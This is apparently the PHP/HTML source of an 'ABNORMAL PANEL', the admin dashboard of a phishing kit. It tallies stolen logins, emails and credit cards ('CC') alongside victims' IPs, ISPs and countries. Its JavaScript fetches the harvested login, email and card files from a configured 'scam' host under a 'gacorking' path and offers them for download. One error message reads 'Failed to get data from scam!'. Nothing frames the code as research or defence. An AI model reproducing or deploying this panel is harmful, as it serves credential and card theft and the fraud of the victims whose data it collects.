<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ABNORMAL PANEL</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.datatables.net/1.13.6/css/jquery.dataTables.min.css">
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
        }

        .container {
            background-color: #1e1e1e;
            padding: 20px;
            border-radius: 10px;
        }

        .card {
            background-color: #2a2a2a;
            border: none;
        }

        .card .card-body {
            color: #ffffff;
        }

        .card.shadow-sm {
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        }

        .btn {
            background-color: #6200ea;
            color: #ffffff;
            border: none;
        }

        .btn:hover {
            background-color: #3700b3;
        }

        table.dataTable {
            background-color: #2a2a2a;
            color: #ffffff;
        }

        table.dataTable thead {
            background-color: #333333;
            color: #ffffff;
        }

        table.dataTable tbody tr {
            background-color: #1e1e1e;
        }

        table.dataTable tbody tr:hover {
            background-color: #292929;
        }

        table.dataTable th, table.dataTable td {
            border-color: #444444;
        }

        a {
            color: #bb86fc;
        }

        a:hover {
            color: #bb86fc;
            text-decoration: underline;
        }
    </style>
</head>
<body>
<div class="container mt-5">
    <h1 class="mb-4 text-center">ABNORMAL PANEL</h1>
    <div class="row text-center">
        <div class="col-md-2 mb-4">
            <div class="card shadow-sm bg-primary text-white">
                <div class="card-body">
                    <i class="fa-solid fa-mouse-pointer fa-2x mb-2"></i>
                    <h5>Click</h5>
                    <p class="fs-4 fw-bold" id="click"><?= $click; ?></p>
                </div>
            </div>
        </div>
        <div class="col-md-2 mb-4">
            <div class="card shadow-sm bg-success text-white">
                <div class="card-body">
                    <i class="fa-solid fa-sign-in-alt fa-2x mb-2"></i>
                    <h5>Login</h5>
                    <p class="fs-4 fw-bold" id="login"><?= $login; ?></p>
                </div>
            </div>
        </div>
        <div class="col-md-2 mb-4">
            <div class="card shadow-sm bg-info text-white">
                <div class="card-body">
                    <i class="fa-solid fa-envelope fa-2x mb-2"></i>
                    <h5>Email</h5>
                    <p class="fs-4 fw-bold" id="email"><?= $email; ?></p>
                </div>
            </div>
        </div>
        <div class="col-md-2 mb-4">
            <div class="card shadow-sm bg-danger text-white">
                <div class="card-body">
                    <i class="fa-solid fa-credit-card fa-2x mb-2"></i>
                    <h5>CC</h5>
                    <p class="fs-4 fw-bold" id="cc"><?= $cc; ?></p>
                </div>
            </div>
        </div>
        <div class="col-md-2 mb-4">
            <div class="card shadow-sm bg-warning text-dark">
                <div class="card-body">
                    <i class="fa-solid fa-robot fa-2x mb-2"></i>
                    <h5>Bot</h5>
                    <p class="fs-4 fw-bold" id="bot"><?= $bot; ?></p>
                </div>
            </div>
        </div>
        <div class="col-md-2 mb-4">
            <div class="card shadow-sm bg-secondary text-white">
                <div class="card-body">
                    <i class="fa-solid fa-users fa-2x mb-2"></i>
                    <h5>Visitor</h5>
                    <p class="fs-4 fw-bold" id="visitor"><?= $visitor_count; ?></p>
                </div>
            </div>
        </div>
    </div>
    <div class="card mt-4 shadow-sm">
        <div class="card-body">
            <h5 class="card-title mb-3">Visitor Data</h5>
            <button id="downloadVisitorData" class="btn btn-primary mb-2">
                <i class="fa-solid fa-download"></i> Download Data
            </button>
            <table id="visitorTable" class="table table-striped table-bordered" style="width:100%">
                <thead>
                    <tr>
                        <th>Date</th>
                        <th>IP</th>
                        <th>OS/Browser</th>
                        <th>Useragent</th>
                        <th>ISP</th>
                        <th>Country</th>
                        <th>Activity</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    if (!empty($visitor[0])) {
                        $reversed_visitor = array_reverse($visitor);
                        foreach ($reversed_visitor as $visitor_data) {
                            $visitor_data = explode("|", $visitor_data);
                            echo "<tr>";
                            foreach ($visitor_data as $visitor_datas) {
                                echo "<td>$visitor_datas</td>";
                            }
                            echo "</tr>";
                        }
                    }
                    ?>
                </tbody>
            </table>
        </div>
    </div>
</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
<script>
$(document).ready(function () {
    // $('#visitorTable').DataTable();

    const types = ['click', 'login', 'email', 'cc', 'bot', 'visitor'];
    types.forEach(type => fetchData(type));

    // setInterval(() => {
    //     types.forEach(type => fetchData(type));
    // }, 30000);

    $('#downloadVisitorData').click(function () {
        const urls = [
            '<?= $setting['scam']; ?>/gacorking/login-<?= $setting['file'] ?>',
            '<?= $setting['scam']; ?>/gacorking/email-<?= $setting['file'] ?>',
            '<?= $setting['scam']; ?>/gacorking/cc-<?= $setting['file'] ?>'
        ];

        urls.forEach(url => {
            fetch(url)
                .then(response => {
                    if (!response.ok) {
                        throw new Error(`Failed to fetch data from ${url}`);
                    }
                    return response.text();
                })
                .then(text => {
                    const fileName = url.split('/').pop();
                    const blob = new Blob([text], { type: 'text/plain' });
                    const downloadLink = document.createElement('a');
                    const objectUrl = URL.createObjectURL(blob);

                    downloadLink.href = objectUrl;
                    downloadLink.download = fileName;
                    document.body.appendChild(downloadLink);
                    downloadLink.click();
                    document.body.removeChild(downloadLink);

                    URL.revokeObjectURL(objectUrl);
                })
                .catch(error => {
                    console.error('Download failed:', error);
                });
        });
    });

    function fetchData(tipe) {
        $.ajax({
            url: '<?= $setting['scam']; ?>/gacorking/'+tipe+'.txt',
            method: 'GET',
            success: function (response) {
                if (tipe === 'visitor') {
                    updateVisitorTable(response);
                }
                const lines = response.split('\n').filter(line => line.trim() !== '');
                const totalLines = lines.length;
                $('#'+tipe).text(totalLines);
            },
            error: function () {
                console.log('Failed to get data from scam!');
            }
        });
    }

    function updateVisitorTable(data) {
        visitorTable.clear();

        const rows = data.split('\n').filter(row => row.trim() !== '');
        rows.forEach(row => {
            const columns = row.split('|');
            visitorTable.row.add(columns).draw(false);
        });
    }
});
</script>
</body>
</html>